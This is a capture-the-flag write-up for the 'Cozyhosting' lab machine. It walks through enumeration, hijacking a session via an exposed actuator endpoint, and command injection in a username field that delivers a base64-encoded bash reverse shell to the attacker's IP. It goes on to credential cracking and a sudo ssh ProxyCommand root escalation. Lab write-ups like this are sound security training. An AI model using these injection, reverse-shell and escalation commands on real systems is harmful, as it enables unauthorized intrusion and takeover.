# Cozyhosting

![Untitled](https://prod-files-secure.s3.us-west-2.amazonaws.com/f9bfba05-ffac-4cb7-8ab6-1bb2160c2151/308901db-406c-410f-87bb-17007d33bbef/Untitled.png)

## Enumeration

nmap -A -sV -sS cozyhosting.htb

![Untitled](https://prod-files-secure.s3.us-west-2.amazonaws.com/f9bfba05-ffac-4cb7-8ab6-1bb2160c2151/4ef25221-41ca-47d9-ba7c-c7eda9fd8ef9/Untitled.png)

dirsearch -u cozyhosting.htb

![Untitled](https://prod-files-secure.s3.us-west-2.amazonaws.com/f9bfba05-ffac-4cb7-8ab6-1bb2160c2151/9222389e-4e4a-4c3e-a79a-08bab3df3ce5/Untitled.png)

I found the session ids for the users in this link http://cozyhosting.htb/actuator/sessions. So i tried to login with the session id of kanderson in inspetctor and i had success.

![Untitled](https://prod-files-secure.s3.us-west-2.amazonaws.com/f9bfba05-ffac-4cb7-8ab6-1bb2160c2151/61459a95-00d7-4a44-b926-19143e29ca08/Untitled.png)

![Untitled](https://prod-files-secure.s3.us-west-2.amazonaws.com/f9bfba05-ffac-4cb7-8ab6-1bb2160c2151/f8f2793f-68b0-4150-99d8-29874073aab5/Untitled.png)

## Exploitation

Scrolling to the bottom of the website i saw possible ssh conection. I passed some inputs and captured them on burpsuite.

![Untitled](https://prod-files-secure.s3.us-west-2.amazonaws.com/f9bfba05-ffac-4cb7-8ab6-1bb2160c2151/bef895fa-8c4f-4cb5-bae5-9f1062dac1ea/Untitled.png)

It responded to the command, so we will try to reverse shell enconded with base64 because of the special characters.

Payload (base64): echo “`/bin/bash -c 'bash -i >& /dev/tcp/<your_ip>/443 0>&1'`" | base64 -w 0

`username=2>/dev/null;echo${IFS}<base64_encoded_payload>|base64${IFS}-d|/bin/bash;#`

SHELL OWNED.

Now we need the user josh flag. We can see this file: cloudhosting-0.0.1.jar.

I created a local server on the machine to download the file:

`python3 -m http.server 4444`

wget http://10.10.11.230:4445/cloudhosting-0.0.1.jar

jd-gui [cloudhosting-0.0.1.jar](http://10.10.11.230:4445/cloudhosting-0.0.1.jar) to see the file 

![Untitled](https://prod-files-secure.s3.us-west-2.amazonaws.com/f9bfba05-ffac-4cb7-8ab6-1bb2160c2151/816f822d-6d16-4c4e-8f8d-8002f9ce9caf/Untitled.png)

Login in postgres database: psql -h 127.0.0.1 -U postgres

Select * from users;

![Untitled](https://prod-files-secure.s3.us-west-2.amazonaws.com/f9bfba05-ffac-4cb7-8ab6-1bb2160c2151/adfd133a-3bf2-451e-986f-0f3742ba1bee/Untitled.png)

john hash.txt --wordlist=/usr/share/wordlists/rockyou.txt

ssh josh@cozyhosting.htb

## Privilege Escalation

sudo -l to see what josh can run as root: (root) /usr/bin/ssh *

There was a simple payload at GTFOBINS which successfully allowed us to get the shell as the superuser(root).

Payload: https://gtfobins.github.io/gtfobins/ssh/#sudo

`sudo ssh -o ProxyCommand=';sh 0<&2 1>&2' x` → FLAG: c70f826511e78055af97293ec35d6420